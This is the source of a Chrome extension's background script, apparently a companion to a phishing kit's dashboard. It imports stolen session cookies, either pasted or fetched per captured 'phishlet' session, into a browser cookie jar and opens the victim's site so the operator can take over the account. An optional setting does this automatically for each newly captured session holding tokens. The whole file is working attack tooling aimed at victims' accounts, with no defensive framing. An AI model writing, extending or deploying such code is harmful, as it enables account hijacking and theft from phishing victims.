'use strict';
/* ============================================================================
   Session Injector - background service worker (MV3)

   Window targets
   --------------
   The operator picks where a victim session should live:

     incognito  a separate cookie jar, so nothing you are signed into is touched
     normal     a normal window in your profile (shares your jar, like before)
     here       reuse the current tab, same jar, no new window

   Only one victim is live per jar, by nature of cookies. Switching victims
   clears the union of the previous and new domains first, so nothing merges.

   Windows get a name (defaults to the victim address) which is applied to the
   pinned session card and to a tab group, so several windows are tellable apart.
   ========================================================================== */

const DEFAULTS = { mode: 'normal', autoOpen: false, namePrefix: '', dashboardUrl: '', user: '', pass: '' };
const K = {
  settings: 'settings',
  wins: 'winIds',
  recent: 'recent',
  active: 'active',
  seen: 'seenIds',
  last: 'lastInject',
  store: 'incognitoStore',
  touched: 'touchedStores',
};
const RECENT_MAX = 8;
const SEEN_MAX = 400;
const MODES = ['incognito', 'normal', 'here'];

function normMode(m) {
  const v = String(m || '').toLowerCase();
  if (v === 'isolated' || v === 'incognito') return 'incognito';
  if (v === 'here') return 'here';
  return 'normal';
}

/* ---------------------------------------------------------------- settings */
async function getSettings() {
  const got = await chrome.storage.local.get(K.settings);
  const s = Object.assign({}, DEFAULTS, got[K.settings] || {});
  s.mode = normMode(s.mode);
  return s;
}
async function setSettings(patch) {
  const next = Object.assign({}, await getSettings(), patch);
  if (next.mode) next.mode = normMode(next.mode);
  await chrome.storage.local.set({ [K.settings]: next });
  return next;
}

function badge(text, color) {
  try {
    chrome.action.setBadgeText({ text: text || '' });
    if (color) chrome.action.setBadgeBackgroundColor({ color });
  } catch (e) { /* cosmetic */ }
}

/* ------------------------------------------------------------ window book */
async function winMap() { return (await chrome.storage.local.get(K.wins))[K.wins] || {}; }
async function saveWinMap(m) {
  if (Object.keys(m).length) await chrome.storage.local.set({ [K.wins]: m });
  else await chrome.storage.local.remove(K.wins);
}

async function liveWindow(kind) {
  const map = await winMap();
  const e = map[kind];
  if (!e) return null;
  try {
    await chrome.windows.get(e.id);
    return { id: e.id, kind: e.kind || kind };
  } catch (err) {
    delete map[kind];
    await saveWinMap(map);
    return null;
  }
}

async function liveWindows() {
  const out = [];
  for (const k of MODES) {
    if (k === 'here') continue;
    const w = await liveWindow(k);
    if (w) out.push({ id: w.id, kind: k, actual: w.kind });
  }
  return out;
}

async function ensureWindow(kind) {
  const want = kind === 'incognito' ? 'incognito' : 'normal';
  const live = await liveWindow(want);
  if (live) return live;

  const base = { focused: true, width: 1180, height: 840 };
  let w;
  let actual = want;
  if (want === 'incognito') {
    try {
      w = await chrome.windows.create(Object.assign({ incognito: true }, base));
    } catch (e) {
      // incognito unavailable (policy / user setting): degrade to a normal window
      actual = 'normal';
      w = await chrome.windows.create(base);
    }
  } else {
    w = await chrome.windows.create(base);
  }
  const map = await winMap();
  map[want] = { id: w.id, kind: actual };
  await saveWinMap(map);
  return { id: w.id, kind: actual };
}

async function touchedMap() { return (await chrome.storage.local.get(K.touched))[K.touched] || {}; }
async function saveTouched(m) { await chrome.storage.local.set({ [K.touched]: m }); }
function allTouched(m) { return Object.keys(m || {}).reduce((a, k) => a.concat(m[k]), []); }
async function storeIdFor(name) { return name === 'incognito' ? await isolatedStoreId() : undefined; }

chrome.windows.onRemoved.addListener(async (id) => {
  const map = await winMap();
  let hit = false;
  for (const k of Object.keys(map)) {
    if (map[k] && map[k].id === id) { delete map[k]; hit = true; }
  }
  if (hit) {
    await saveWinMap(map);
    const got = await chrome.storage.local.get(K.active);
    if (got[K.active] && got[K.active].winId === id) {
      await chrome.storage.local.remove([K.active, K.touched]);
    }
  }
});

// Chrome exposes the incognito store as an opaque id (in practice "1"). Probe for
// it instead of hardcoding, and cache the answer.
async function isolatedStoreId() {
  const got = await chrome.storage.local.get(K.store);
  if (got[K.store]) return got[K.store];
  let id = '1';
  try {
    const all = await chrome.cookies.getAll({});
    const inc = all.find((c) => c.storeId && c.storeId !== '0');
    if (inc) id = inc.storeId;
  } catch (e) { /* default is fine */ }
  await chrome.storage.local.set({ [K.store]: id });
  return id;
}

/* ----------------------------------------------------------------- cookies */
function cookieURL(c) {
  const host = String(c.domain || '').replace(/^\./, '');
  return (c.secure ? 'https://' : 'http://') + host + (c.path || '/');
}

function sameSiteOf(c) {
  const s = String(c.sameSite || '').toLowerCase();
  if (s === 'strict') return 'strict';
  if (s === 'none' || s === 'no_restriction') return 'no_restriction';
  if (s === 'lax') return 'lax';
  return 'unspecified';
}

function cookieDetails(c, storeId) {
  const isHost = c.name.indexOf('__Host-') === 0;
  const isSecure = c.name.indexOf('__Secure-') === 0;
  const sameSite = sameSiteOf(c);
  const details = {
    url: cookieURL(c),
    name: c.name,
    value: c.value == null ? '' : String(c.value),
    path: c.path || '/',
    // __Host- demands host-only + path=/ + secure; __Secure- demands secure
    secure: !!(c.secure || isSecure || isHost || sameSite === 'no_restriction'),
    httpOnly: !!c.httpOnly,
    sameSite: sameSite,
  };
  if (!isHost && c.domain) details.domain = c.domain;
  if (!c.session && c.expirationDate) details.expirationDate = c.expirationDate;
  if (storeId) details.storeId = storeId;
  return details;
}

function domainsOf(cookies) {
  return Array.from(new Set((cookies || []).map((c) => String(c.domain || '').replace(/^\./, '')).filter(Boolean)));
}

async function clearDomains(domains, storeId) {
  let removed = 0;
  for (const d of domains) {
    let existing = [];
    try {
      const filter = storeId ? { domain: d, storeId } : { domain: d };
      existing = await chrome.cookies.getAll(filter);
    } catch (e) { existing = []; }
    for (const c of existing) {
      try {
        const opts = { url: cookieURL(c), name: c.name };
        if (storeId) opts.storeId = storeId;
        await chrome.cookies.remove(opts);
        removed++;
      } catch (e) { /* already gone */ }
    }
  }
  return removed;
}

async function applyCookies(cookies, storeId, clearList) {
  const res = { success: 0, failed: 0, cleared: 0, errors: [] };
  res.cleared = await clearDomains(clearList || domainsOf(cookies), storeId);
  for (const c of cookies) {
    try {
      const r = await chrome.cookies.set(cookieDetails(c, storeId));
      if (r) res.success++;
      else { res.failed++; res.errors.push(c.name + ' @ ' + c.domain + ': rejected'); }
    } catch (e) {
      res.failed++;
      res.errors.push(c.name + ' @ ' + c.domain + ': ' + e.message);
    }
  }
  return res;
}

/* --------------------------------------------------------------- labelling */
function labelFor(payload, st, opts) {
  const explicit = (opts && opts.name) || payload.name;
  if (explicit && String(explicit).trim()) return String(explicit).trim().slice(0, 60);
  const who = (payload.username || '').trim() ||
    (payload.phishlet ? '(' + payload.phishlet + ')' : '') ||
    ('session ' + payload.session_id);
  const pre = (st.namePrefix || '').trim();
  // "camp-" + alice -> camp-alice, but "camp" + alice -> camp alice
  const joined = pre ? (/[-_.\/]$/.test(pre) ? pre + who : pre + ' ' + who) : who;
  return joined.trim().slice(0, 60);
}

function infoOf(payload, where, label, winId) {
  return {
    id: payload.session_id,
    phishlet: payload.phishlet || '',
    username: payload.username || '',
    ip: payload.remote_addr || '',
    url: payload.target_url || '',
    count: (payload.cookies || []).length,
    at: Date.now(),
    where: where,
    name: label,
    winId: winId || null,
  };
}

/* ------------------------------------------------------------------- window */
async function openTabs(winId, payload, label) {
  const cardURL = chrome.runtime.getURL('session-card.html');
  const tabs = await chrome.tabs.query({ windowId: winId });
  let card = tabs.find((t) => t.url && t.url.indexOf(cardURL) === 0);
  if (!card) card = await chrome.tabs.create({ windowId: winId, url: cardURL, pinned: true, index: 0 });
  let target = tabs.find((t) => t.id !== card.id && t.url && t.url.indexOf(cardURL) !== 0);
  if (target) await chrome.tabs.update(target.id, { url: payload.target_url, active: true });
  else target = await chrome.tabs.create({ windowId: winId, url: payload.target_url, active: true });
  // name the window: group the tabs under a labelled chip
  try {
    const gid = await chrome.tabs.group({ tabIds: [card.id, target.id], createProperties: { windowId: winId } });
    await chrome.tabGroups.update(gid, { title: label, color: 'blue' });
  } catch (e) { /* older Chrome: the pinned card still carries the name */ }
  return target;
}

/* ----------------------------------------------------------------- takeover */
async function takeover(payload, mode, opts) {
  const st = await getSettings();
  const where = normMode(mode || st.mode);
  const cookies = payload.cookies || [];
  const label = labelFor(payload, st, opts);
  let res;
  let winId = null;

  if (where === 'here') {
    res = await applyCookies(cookies, undefined);
    res.where = 'this profile';
    if (payload.target_url) await chrome.tabs.create({ url: payload.target_url, active: true });
  } else {
    const win = await ensureWindow(where);
    winId = win.id;
    const sname = win.kind === 'incognito' ? 'incognito' : 'default';
    const storeId = await storeIdFor(sname);
    // clear everything we ever wrote into THIS jar plus the new domains, so
    // switching victims (or modes) never merges two people's cookies
    const touched = await touchedMap();
    const domains = Array.from(new Set(allTouched(touched).concat(domainsOf(cookies))));
    res = await applyCookies(cookies, storeId, domains);
    res.where = win.kind === 'incognito' ? 'incognito window' : 'normal window';
    touched[sname] = domains;
    await chrome.storage.local.set({
      [K.touched]: touched,
      [K.active]: infoOf(payload, where, label, winId),
    });
    if (payload.target_url) await openTabs(winId, payload, label);
    await chrome.windows.update(winId, { focused: true });
  }

  const info = infoOf(payload, where, label, winId);
  await remember(info, payload);
  await chrome.storage.local.set({ [K.last]: Object.assign({}, info, { failed: res.failed, where: res.where }) });

  if (res.success > 0) badge(String(res.success), '#2563eb');
  setTimeout(() => badge('', null), 4000);
  return res;
}

async function remember(info, payload) {
  const got = await chrome.storage.local.get(K.recent);
  const list = (got[K.recent] || []).filter((x) => x.id !== info.id);
  list.unshift(Object.assign({}, info, { cookies: payload.cookies || [], target_url: payload.target_url || '' }));
  await chrome.storage.local.set({ [K.recent]: list.slice(0, RECENT_MAX) });
}

/* ------------------------------------------------------------- paste-in ---- */
// Accepts Cookie-Editor style JSON, our export shape, a bare {name: value} map,
// a raw "Cookie:" header, or a document.cookie string.
function normalizeCookie(raw, host) {
  if (!raw || typeof raw !== 'object') return null;
  const name = String(raw.name == null ? '' : raw.name).trim();
  if (!name) return null;
  const c = {
    name: name,
    value: raw.value == null ? '' : String(raw.value),
    domain: String(raw.domain || raw.host || host || '').trim(),
    path: raw.path || '/',
    secure: !!raw.secure,
    httpOnly: !!raw.httpOnly,
    sameSite: raw.sameSite || 'Lax',
  };
  if (!c.domain) return null;
  if (raw.expirationDate) c.expirationDate = Math.floor(Number(raw.expirationDate)) || 0;
  if (Number.isNaN(c.expirationDate)) delete c.expirationDate;
  if (raw.session || !c.expirationDate) c.session = true;
  return c;
}

function parseCookies(text, targetUrl) {
  const out = { cookies: [], error: '', format: '', host: '' };
  const body = String(text || '').trim();
  if (!body) { out.error = 'nothing pasted'; return out; }
  try { out.host = new URL(targetUrl).hostname; } catch (e) { out.host = ''; }

  if (body[0] === '[' || body[0] === '{') {
    let data;
    try { data = JSON.parse(body); } catch (e) { out.error = 'invalid JSON: ' + e.message; return out; }
    let arr = Array.isArray(data) ? data : (data && Array.isArray(data.cookies) ? data.cookies : null);
    if (!arr && data && typeof data === 'object') {
      arr = Object.keys(data).map((k) => (typeof data[k] === 'object' ? Object.assign({ name: k }, data[k]) : { name: k, value: data[k] }));
    }
    if (!arr || !arr.length) { out.error = 'no cookies found in the JSON'; return out; }
    out.format = 'json';
    out.cookies = arr.map((c) => normalizeCookie(c, out.host)).filter(Boolean);
    if (!out.cookies.length) { out.error = 'no usable cookies in the JSON (each needs a name and a domain)'; return out; }
    if (out.cookies.length > 500) out.cookies = out.cookies.slice(0, 500);
    return out;
  }

  out.format = 'text';
  if (!out.host) { out.error = 'plain text needs a target URL so the domain is known'; return out; }
  const flat = body.replace(/^cookie\s*:\s*/i, '').replace(/\r/g, '');
  for (const part of flat.split(/[;\n]+/)) {
    const s = part.trim();
    if (!s) continue;
    const i = s.indexOf('=');
    if (i <= 0) continue;
    const c = normalizeCookie({ name: s.slice(0, i), value: s.slice(i + 1) }, out.host);
    if (c) out.cookies.push(c);
  }
  if (!out.cookies.length) { out.error = 'no name=value pairs found'; return out; }
  if (out.cookies.length > 500) out.cookies = out.cookies.slice(0, 500);
  return out;
}

async function takeFromText(msg) {
  const target = String(msg.targetUrl || '').trim();
  if (!/^https?:\/\//i.test(target)) return { error: 'a target URL (https://...) is required' };
  const p = parseCookies(msg.text, target);
  if (p.error) return { error: p.error };
  const payload = {
    session_id: 'paste-' + Date.now().toString(36),
    phishlet: (msg.phishlet || 'pasted'),
    username: (msg.name || '').trim(),
    target_url: target,
    cookies: p.cookies,
    count: p.cookies.length,
  };
  const r = await takeover(payload, msg.mode, { name: msg.name });
  return Object.assign({ parsed: p.cookies.length, format: p.format, domains: domainsOf(p.cookies) }, r);
}

/* ------------------------------------------- optional direct dashboard fetch */
function b64(s) {
  try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); }
}
function authHeaders(st) {
  return (st.user || st.pass) ? { Authorization: 'Basic ' + b64(st.user + ':' + st.pass) } : {};
}

async function fetchSession(id) {
  const st = await getSettings();
  const base = (st.dashboardUrl || '').replace(/\/+$/, '');
  if (!base) return { error: 'no dashboard url set' };
  try {
    const r = await fetch(base + '/api/v1/sessions/' + encodeURIComponent(id) + '/cookies', {
      credentials: 'include',
      headers: authHeaders(st),
    });
    if (!r.ok) return { error: 'dashboard returned ' + r.status };
    const d = await r.json();
    if (!d.count) return { error: 'session has no cookies' };
    return d;
  } catch (e) {
    return { error: e.message };
  }
}

/* ------------------------------------------------------------ auto takeover */
async function seenNewSessions(list) {
  const got = await chrome.storage.local.get(K.seen);
  const known = got[K.seen] || null;
  const now = list.map((s) => s.id);
  const fresh = known ? list.filter((s) => known.indexOf(s.id) === -1) : [];
  await chrome.storage.local.set({ [K.seen]: now.concat(known || []).slice(0, SEEN_MAX) });
  return fresh;
}

/* ---------------------------------------------------------------- messaging */
async function onMessage(msg) {
  switch (msg && msg.action) {
    case 'inject':
      return await takeover(msg.payload || {}, msg.mode, msg.opts);
    case 'paste':
      return await takeFromText(msg);
    case 'parse': {
      const p = parseCookies(msg.text, msg.targetUrl);
      return { error: p.error, count: p.cookies.length, format: p.format, domains: domainsOf(p.cookies) };
    }
    case 'injectById': {
      const d = await fetchSession(msg.id);
      if (d.error) return { error: d.error };
      return await takeover(d, msg.mode, msg.opts);
    }
    case 'sessions': {
      const fresh = await seenNewSessions(msg.list || []);
      const st = await getSettings();
      const withTokens = fresh.filter((s) => s.has_tokens);
      if (withTokens.length) {
        badge(String(withTokens.length), '#22c55e');
        setTimeout(() => badge('', null), 6000);
      }
      if (st.autoOpen && withTokens.length) {
        const d = await fetchSession(withTokens[0].id);
        if (!d.error) await takeover(d, st.mode);
      }
      return { fresh: withTokens.length };
    }
    case 'dashboard':
      if (msg.url) await setSettings({ dashboardUrl: msg.url });
      return { ok: true };
    case 'settings':
      return await setSettings(msg.patch || {});
    case 'rename': {
      const got = await chrome.storage.local.get(K.active);
      if (!got[K.active]) return { error: 'nothing is live' };
      const name = String(msg.name || '').trim().slice(0, 60);
      const next = Object.assign({}, got[K.active], { name: name });
      await chrome.storage.local.set({ [K.active]: next });
      if (next.winId) {
        try {
          const tabs = await chrome.tabs.query({ windowId: next.winId });
          const g = tabs.find((t) => t.groupId && t.groupId !== -1);
          if (g) await chrome.tabGroups.update(g.groupId, { title: name });
        } catch (e) { /* group optional */ }
      }
      return { name: name };
    }
    case 'state': {
      const st = await getSettings();
      const won = await liveWindows();
      const got = await chrome.storage.local.get([K.recent, K.active, K.last]);
      return { settings: st, windows: won, recent: got[K.recent] || [], active: got[K.active] || null, last: got[K.last] || null };
    }
    case 'clearIsolated': {
      const touched = await touchedMap();
      let cleared = 0;
      for (const sname of Object.keys(touched)) {
        cleared += await clearDomains(touched[sname], await storeIdFor(sname));
      }
      await chrome.storage.local.remove([K.active, K.touched]);
      return { cleared: cleared };
    }
    case 'closeWindows': {
      const won = await liveWindows();
      for (const w of won) { try { await chrome.windows.remove(w.id); } catch (e) { } }
      return { closed: won.length };
    }
    default:
      return { error: 'unknown action' };
  }
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  onMessage(msg).then(sendResponse).catch((e) => sendResponse({ error: String((e && e.message) || e) }));
  return true; // async
});
